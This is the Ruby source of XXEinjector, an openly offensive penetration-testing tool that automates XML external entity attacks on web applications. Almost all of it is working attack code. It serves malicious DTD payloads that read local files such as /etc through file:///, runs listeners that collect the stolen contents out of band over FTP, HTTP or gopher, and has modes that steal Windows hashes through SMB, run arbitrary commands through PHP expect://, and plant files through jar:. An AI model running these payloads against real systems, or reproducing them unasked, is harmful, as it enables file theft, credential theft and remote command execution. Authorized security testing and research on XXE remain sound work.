#!/usr/bin/env ruby

require 'socket'
require 'fileutils'
require 'uri'
require 'net/http'
require 'net/https'
require 'base64'

# CONFIGURE
host = "" # our external ip
path = "" # path to enumerate
$file = "" # file with vulnerable HTTP request
enum = "ftp" # which out of band protocol should be used for file retrieval - ftp/http

$proto = "http" # protocol to use - http/https
$proxy = "" # proxy host
$proxy_port = "" # proxy port

phpfilter = "n" # if yes php filter will be used to base64 encode file content - y/n
enumall = "n" # if yes XXEinjector will not ask what to enum (prone to false positives) - y/n
brute = "n" # if filenames should be taken from brute.txt - y/n
bfile = "" # file with paths to bruteforce

hashes = "n" # steal Windows hashes
upload = "n" # upload any file into temp directory using Java jar schema
ufile = "" # file that should be uploaded
expect = "n" # tries to execute arbitrary command using PHP expect
cmdexpect = "" # command that gets executed using PHP expect

$verbose = "n" # verbose messaging
timeout = 10 # timeout for receiving responses

http_port = 80 # http port that receives file contents/directory listings and serves XML files
ftp_port = 21 # ftp port that receives file contents/directory listings
gopher_port = 70 # gopher port that receives file contents/directory listings
jar_port = 1337 # port accepts connections and then sends files

# set all variables
ARGV.each do |arg|
	host = arg.split("=")[1] if arg.include?("--host=")
	path = arg.split("=")[1] if arg.include?("--path=")
	$file = arg.split("=")[1] if arg.include?("--file=")
	enum = arg.split("=")[1] if arg.include?("--oob=")
	$proto = "https" if arg.include?("--ssl")
	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
	phpfilter = "y" if arg.include?("--phpfilter")
	enumall = "y" if arg.include?("--fast")
	brute = "y" if arg.include?("--brute=")
	bfile = arg.split("=")[1] if arg.include?("--brute=")
	$verbose = "y" if arg.include?("--verbose")
	http_port = arg.split("=")[1] if arg.include?("--httpport=")
	ftp_port = arg.split("=")[1] if arg.include?("--ftpport=")
	gopher_port = arg.split("=")[1] if arg.include?("--gopherport=")
	jar_port = arg.split("=")[1] if arg.include?("--jarport=")
	timeout = Integer(arg.split("=")[1]) if arg.include?("--timeout=")
	hashes = "y" if arg.include?("--hashes")
	upload = "y" if arg.include?("--upload=")
	ufile = arg.split("=")[1] if arg.include?("--upload=")
	expect = "y" if arg.include?("--expect=")
	cmdexpect = arg.split("=")[1] if arg.include?("--expect=")
end

# show sample request file
if ARGV.include? "--xml"
	puts ""
	puts "POST /parsexml.php HTTP/1.1"
	puts "Host: 192.168.0.1:8080"
	puts "Content-Type: application/xml"
	puts "Content-Length: 215"
	puts ""
	puts "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
	puts "<!DOCTYPE x [ <!ENTITY % remote SYSTEM \"http://192.168.0.2:88/file.dtd\"> %remote;%int;%trick;]>"
	puts ""
	exit(1)
end

# show main menu
if ARGV.nil? || ARGV.size < 3 || host == "" || $file == "" || (path == "" && bfile == "" && hashes == "n" && upload == "n" && expect == "n")
	puts "XXEinjector by Jakub Palaczynski"
	puts ""
	puts "XXEinjector automates retrieving files using out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
	puts ""
	puts "Options:"
	puts "  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)"
	puts "  --file	Mandatory - File containing HTTP request. Entity in request file needs to point to file.dtd on XXEinjector HTTP server. Issue --xml to show sample HTTP request. (--file=/tmp/req.txt)"
	puts "  --path	Mandatory if enumerating directories - Path to enumerate. (--path=/etc)"
	puts "  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)"
	puts ""
	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
	puts "  --phpfilter		Use PHP filter to base64 encode target file before sending."
	puts ""
	puts "  --hashes	Steals Windows hash of the user that runs an application."
	puts "  --expect	Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)"
	puts "  --upload	Uploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)"
	puts ""
	puts "  --ssl		Use SSL."
	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
	puts "  --httpport	Set custom HTTP port. (--httpport=80)"
	puts "  --ftpport	Set custom FTP port. (--ftpport=21)"
	puts "  --gopherport	Set custom gopher port. (--gopherport=70)"
	puts "  --jarport	Set custom port for uploading files using jar. (--jarport=1337)"
	puts ""
	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
	puts "  --fast	Skip asking what to enumerate. Prone to false-positives."
	puts "  --verbose	Show verbose messages."
	puts ""
	puts "Example usage:"
	puts "  Enumerating /etc directory in HTTPS application:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl"
	puts "  Enumerating /etc directory using gopher for OOB method:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher"
	puts "  Bruteforcing files using HTTP out of band method:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http"
	puts "  Stealing Windows hashes:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --hashes"
	puts "  Uploading files using Java jar:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf"
	puts "  Executing system commands using PHP expect:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls"
	puts ""
	exit(1)
else
	puts "XXEinjector by Jakub Palaczynski"
	puts ""
end

# EXECUTION
http = TCPServer.new http_port
if enum == "ftp"
	ftp = TCPServer.new ftp_port
end
if enum == "gopher"
	gopher = TCPServer.new gopher_port
end
if upload == "y"
	jar = TCPServer.new jar_port
end

# regex to find directory listings
regex = /^[$.\-_~ 0-9A-Za-z]+$/
# array that holds filenames to enumerate
filenames = Array.new
# temp path holders - hold next filenames in different format being enumerated
nextpath = ""
enumpath = ""
# array that contains skipped paths
blacklist = Array.new
# other variables
$port = 0 # remote host application port - fill if HTTP/1.0 is used
$remote = "" # remote host URL/IP address - fill if HTTP/1.0 is used
$method = "post" # HTTP method - get/post
cmp = "" # holds user input
switch = 0 # this switch locks enumeration if response is pending
i = 0 # main counter

### Processing Request File ###
def sendreq()

	# check HTTP method
	if File.readlines($file)[0].include?("GET ")
		$method = "get"
	end

	# get URI path
	uri = File.readlines($file)[0].split(" ")[1]

	# get connection host and port
	i = 1
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if File.readlines($file)[i].include?("Host: ")
			$remote = File.readlines($file)[i].split(" ")[1]
			if $proto == "http"
				$port = 80
			else
				$port = 443
			end
			if $remote.include?(":")
				$port = $remote.split(":")[1]
				$remote = $remote.split(":")[0]
			end
		end
		i = i + 1
	end

	# get headers
	i = 1
	headers = Hash.new
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if !File.readlines($file)[i].include?("Host: ")
			header = File.readlines($file)[i].chomp
			headers[header.split(": ")[0]] = header.split(": ")[1]
		end
		i = i + 1
	end

	# get POST body
	i = i + 1
	post = ""
	if $method == "post"
		loop do
			break if File.readlines($file)[i].nil?
			postline = File.readlines($file)[i]
			post += postline
			i = i + 1
		end
	end

	# set proxy
	if $proxy == ""
		$proxy = nil
		$proxy_port = nil
	end

	# sending request
	request = Net::HTTP.new($remote, $port, $proxy, $proxy_port)
	if $verbose == "y"
		puts "Sending request with malicious XML:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{uri}"
			puts headers
			puts "\n"
			puts post
			puts "\n"
		else
			puts "https://#{$remote}:#{$port}#{uri}"
			puts headers
			puts "\n"
			puts post
			puts "\n"
		end
	else
		puts "Sending request with malicious XML."
	end

	# set HTTPS
	if $proto == "https"
		request.use_ssl = true
		request.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
	request.start { |r|
		begin
			status = Timeout::timeout(1) {
    				if $method == "post"
					r.post(uri, post, headers) 
				else
					r.get(uri, headers)
				end
  			}
		rescue Timeout::Error
		end
	}
end
### End of Processing Request File ###

# Remove first slash if unix-like path specified
cut = 0
if path[0] == "/"
	path[0] = ''
	cut = 1
end

# Remove slash at the end if unix-like path specified
if path[-1] == "/"
	path[-1] = ''
end

# Remove backslash at the end if Windows system
if path[-2..-1] == "\\\\"
	path[-2..-1] = ''
end
if path[-1] == "\\"
	path[-1] = ''
end

# HTTP for XML serving and data retrival
Thread.start do
loop do
  Thread.start(http.accept) do |client|
	done = 0
	tmppath = nextpath
	loop {

		params = {}
		req = client.gets()
		break if req.nil?

		# HTTP XML serving
		if req.include? "file.dtd"

			puts "Request for XML:\n#{req}\n" if $verbose == "y"

			if hashes == "n" && upload == "n" && expect == "n"
				if cut == 1
					puts "Responding with XML for: /#{enumpath}"
				else
					puts "Responding with XML for: #{enumpath}"
				end
			else
				puts "Responding with XML for."
			end

			# respond with proper XML
			if hashes == "y"
				payload = "<!ENTITY % payl \"hashes\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'file:////#{host}/hash/hash.txt'>\">"
				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
			elsif upload == "y"
				payload = "<!ENTITY % payl \"upload\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'jar:http://#{host}:#{jar_port}!/upload'>\">"
				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
			elsif expect == "y"
				if enum == "ftp"
					if phpfilter == "n"
						payload = "<!ENTITY % payl SYSTEM \"expect://#{cmdexpect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
					else
						payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=expect://#{cmdexpect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
					end
				elsif enum == "http"
					if phpfilter == "n"
						payload = "<!ENTITY % payl SYSTEM \"expect://#{cmdexpect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
					else
						payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=expect://#{cmdexpect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-Length: #{payload.bytesize}\r\nConnection: close\r\n\r\n#{payload}")
					end
				end
			elsif enum == "ftp" && expect == "n"
				if phpfilter == "n"
					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				else
					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				end
			elsif enum == "http" && expect == "n"
				if phpfilter == "n"
					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				else
					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				end
			elsif enum == "gopher" && expect == "n"
				payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'gopher://#{host}:#{gopher_port}/?gopher=%payl;'>\">"
				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
			end
			puts "XML payload sent:\n#{payload}\n\n" if $verbose == "y"

		end

		# HTTP data retrival
		if req.include? "?p="
			
			switch = 0
			puts "Response with file/directory content received:\n" + req + "\nEnumeration unlocked." if $verbose == "y"
			
			# retrieve p parameter value and respond
			req = req.sub("GET /?p=", "").split(" ")[0]
			client.print("HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\nContent-Type: plain/text\r\n\r\nThanks")

			# base64 decode if parameter was encoded
			if phpfilter == "y"
				req = Base64.decode64(req)
			end

			# if PHP expect then print and exit
			if expect == "y"
				puts "Result of \"#{cmdexpect}\" command:\n" + req
				exit(1)
			end

			req.split("%0A").each do |param|

				# log to separate file or brute.log if in bruteforce mode
				if brute == "n"
					logpath = "#{path}"
					if tmppath != ""
						if cut == 1
							logpath += "/"
						else
							logpath += "\\"
						end
					end
					logpath += "#{tmppath}"
					logpath = logpath.gsub('\\','/')
					if tmppath != ""
						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
					else
						if logpath.include?("/")
							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
						else
							FileUtils.mkdir_p $remote + "/" + logpath
						end
					end
					if  done == 0
						if cut == 1
							puts "Successfully logged file: /#{logpath}"
							done = 1
						else
							puts "Successfully logged file: #{logpath}"
							done = 1
						end
					end
					log = File.open($remote + "/" + "#{logpath}.log", "a")
					log.write param + "\n"
					log.close
				else
					log = File.open("brute.log", "a")
					log.write param + "\n"
					puts "Bruteforced request logged: #{param}" if $verbose == "y"
					log.close
				end	

				# push to array if directory listing is detected for further enumeration
				if brute == "n"
					param = param.chomp
					if param.match regex
						logp = tmppath
						if tmppath != ""
							if cut == 1
								logp += "/"
							else
								logp += "\\"
							end
						end
						logp += param
						filenames.push(logp)
						puts "Path pushed to array: #{logp}" if $verbose == "y"
					end
				end
			end
		end
		client.close

	}
  end
end
end

# FTP server to read files/directory listings and log to files
if enum == "ftp"
	Thread.start do
	loop do
  	  Thread.start(ftp.accept) do |client|
		done = 0
		switch = 0
		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
		tmppath = nextpath
		client.puts("220 XXEinjector Welcomes!")
		loop {
			req = client.gets()
			break if req.nil?	

			# respond with proper option
			if req.include? "LIST"
				client.puts("drwxrwxrwx 1 xxe xxe          1 Jan 01 01:01 xxe")
				client.puts("150 Opening BINARY mode data connection for /xxe")
				client.puts("226 Transfer complete")
			end
			if req.include? "USER"
				client.puts("331 password required")
			end
			if req.include? "PORT"
				client.puts("200 PORT command OK")
			else
				client.puts("230 Now you can send data")
			end
		
			# truncate requests to proper format and base64 decode if encoded
			if req.include? "RETR "
				req = req.split(' ')[1..-1].join(' ')
				req += "\n"
			end

			if phpfilter == "y"
				req = Base64.decode64(req)
			end

			# if PHP expect then print and exit
			if expect == "y"
				puts "Result of \"#{cmdexpect}\" command:\n" + req
				exit(1)
			end
			
			# log to separate file or brute.log if in bruteforce mode
			if brute == "n"
				logpath = ""
				logpath += "#{path}"
				if tmppath != ""
					if cut == 1
						logpath += "/"
					else
						logpath += "\\"
					end
				end
				logpath += "#{tmppath}"
				logpath = logpath.gsub('\\','/')
				if tmppath != ""
					FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
				else
					if logpath.include?("/")
						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
					else
						FileUtils.mkdir_p $remote + "/" + logpath
					end
				end
				if  done == 0
					if cut == 1
						puts "Successfully logged file: /#{logpath}"
						done = 1
					else
						puts "Successfully logged file: #{logpath}"
						done = 1
					end
				end
				log = File.open($remote + "/" + "#{logpath}.log", "a")
				log.write req
				log.close
			else
				log = File.open("brute.log", "a")
				log.write req
				puts "Bruteforced request logged: #{req}" if $verbose == "y"
				log.close
			end	

			# clear requests that are known to be not part of directory listing
			req = req.chomp
			if req.match(/^USER /)
				req = ""
			end
			if req.match(/^PASS /)
				req = ""
			end
			if req == "TYPE I"
				req = ""
			end
			if req.include? "EPSV"
				req = ""
			end	

			# push to array if directory listing is detected for further enumeration
			if brute == "n"
				if req.match regex
					logp = tmppath
					if tmppath != ""
						if cut == 1
							logp += "/"
						else
							logp += "\\"
						end
					end
					logp += req
					filenames.push(logp)
					puts "Path pushed to array: #{logp}" if $verbose == "y"
				end
			end

		}
  	  end
	end
	end
end

# gopher server to read files/directory listings and log to files
if enum == "gopher"
	Thread.start do
	loop do
 	  Thread.start(gopher.accept) do |client|
		done = 0
		switch = 0
		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
		tmppath = nextpath
		loop {
			req = ""
			loop do
				tmp = client.gets()
				break if tmp.chomp == ""
				req += tmp
			end

			req.sub! 'gopher=', ''
			req.split("\n").each do |param|

				# log to separate file or brute.log if in bruteforce mode
				if brute == "n"
					logpath = ""
					logpath += "#{path}"
					if tmppath != ""
						if cut == 1
							logpath += "/"
						else
							logpath += "\\"
						end
					end
					logpath += "#{tmppath}"
					logpath = logpath.gsub('\\','/')
					if tmppath != ""
						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
					else
						if logpath.include?("/")
							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
						else
							FileUtils.mkdir_p $remote + "/" + logpath
						end
					end
					if  done == 0
						if cut == 1
							puts "Successfully logged file: /#{logpath}"
							done = 1
						else
							puts "Successfully logged file: #{logpath}"
							done = 1
						end
					end
					log = File.open($remote + "/" + "#{logpath}.log", "a")
					log.write param + "\n"
					log.close
				else
					log = File.open("brute.log", "a")
					log.write param + "\n"
					puts "Bruteforced request logged: #{param}" if $verbose == "y"
					log.close
				end
		
				# push to array if directory listing is detected for further enumeration
				if brute == "n"
					if param.match regex
						logp = tmppath
						if tmppath != ""
							if cut == 1
								logp += "/"
							else
								logp += "\\"
							end
						end
							logp += param
						filenames.push(logp)
						puts "Path pushed to array: #{logp}" if $verbose == "y"
					end
				end
			end

		}
  	  end
	end
	end
end

# TCP server for uploading files using Java jar
if upload == "y"
	Thread.start do
	loop do
  	  Thread.start(jar.accept) do |client|
		content = IO.binread(ufile)
		count = 0
		puts "File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed (CTRL+C)."
		loop do
			if count == 0
				client.puts(content)
				count = 1
			end
			sleep(10000)
		end
	  end		
	end
	end
end

# Retriving Windows hashes
if hashes == "y"
	puts "Start msfconsole with auxiliary/server/capture/smb. Press enter when started."
	$stdin.gets
	sendreq()
	sleep(10)
	puts "Check msfconsole for hashes."
	$stdin.gets
	exit(1)
end

# Sending first request
if brute == "n"
	enumpath = path
	switch = 1
	puts "Enumeration locked." if $verbose == "y"
	sendreq()

	# Loop that checks if response with next file content was received by FTP/HTTP servers
	loop do
		sleep timeout
		if switch == 1 && hashes == "n" && upload == "n"
			puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
			cmp = $stdin.gets.chomp
			break if cmp == "n" || cmp == "N"
			sleep timeout
		else
			break
		end
	end
end

# read, ask and further enumerate
loop do
	if brute == "n"
		if !filenames[i].nil?
		
			# Read next line
			line = filenames[i]
			line = line.chomp
			line = line.gsub(' ','%20')
		
			# Check if a file should be enumerated
			if cut == 1
				check = "#{path}/#{line}".split("/")[0..-2].join('/')
			else
				check = "#{path}\\#{line}".split("\\")[0..-2].join('\\')
			end
			if enumall != "y" && !blacklist.include?(check)
				if cut == 0
					puts "Enumerate #{path}\\#{line} ? Y[yes]/n[no]/s[skip all files in this directory]"
				else
					if path == ""
						puts "Enumerate /#{line} ? Y[yes]/n[no]/s[skip all files in this directory]"
					else
						puts "Enumerate /#{path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]"
					end
				end
				cmp = $stdin.gets.chomp
				if cmp == "s" || cmp == "S"
					if cut == 0
						blacklist.push("#{path}\\#{line}".split("\\")[0..-2].join('\\'))
					
					else
						blacklist.push("#{path}/#{line}".split("/")[0..-2].join('/'))
					end
				end
			elsif	enumall == "y"
				cmp = "y"
			else 
				cmp = "n"
			end
			if cmp == "y" || cmp == "Y" || cmp == ""
				if enumall != "y"
					switch = 1
					puts "Enumeration locked." if $verbose == "y"
				end
				nextpath = "#{line}"
	
				# Send request with next filename
				if cut == 1
					enumpath = "#{path}/#{line}"
					sendreq()
				else
					enumpath = "#{path}\\#{line}"
					sendreq()
				end

				# Loop that checks if response with next file content was received by FTP/HTTP servers
				loop do
					sleep timeout
					if switch == 1
						puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
						cmp = $stdin.gets.chomp
						break if cmp == "n" || cmp == "N"
						sleep timeout
					else
						break
					end
				end

			end
			i = i + 1
		end
	else
		brutefile = File.open(bfile, "r")
		if !IO.readlines(brutefile)[i].nil?
		
			# Read next line
			line = IO.readlines(brutefile)[i]
			line = line.chomp

			log = File.open( "brute.log", "a")
			log.write "\n"
			log.write "Filename: #{line}\n"
			log.close

			if line[0] == "/"
				line[0] = ''
			end

			line = line.gsub(' ','%20')

			# Send request with next filename
			enumpath = "#{line}"
			sendreq()

			i = i + 1

		end
		brutefile.close
		sleep timeout
	end
end
